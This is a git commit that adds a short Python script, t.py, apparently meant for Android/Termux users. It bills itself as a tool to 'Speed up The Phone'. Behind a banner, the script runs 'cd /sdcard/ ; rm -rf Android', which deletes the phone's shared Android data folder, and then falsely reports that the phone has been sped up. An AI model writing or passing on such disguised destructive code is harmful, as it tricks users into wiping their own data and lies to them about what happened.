a7536dc426393ba0484e34e675d072355fc10f9f
Hydra NET <67011201+hydra20@users.noreply.github.com>
2020-08-05 20:56:51 +0100

    Add files via upload

---
+++ t.py
@@ -0,0 +1,17 @@
+import os,sys,time 
+
+def jalan(z):
+    for e in z +'\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(00000.04)
+
+os.system('clear')
+jalan ("\033[1;33mHydra NET "* 6)
+print "\033[0;35m"
+os.system('figlet Speed up The Phone')
+time.sleep(3)
+print "\033[1;31"
+os.system('cd /sdcard/ ; rm -rf Android ')
+jalan  ("\033[1;31mYour phone has been speeded up ")
+
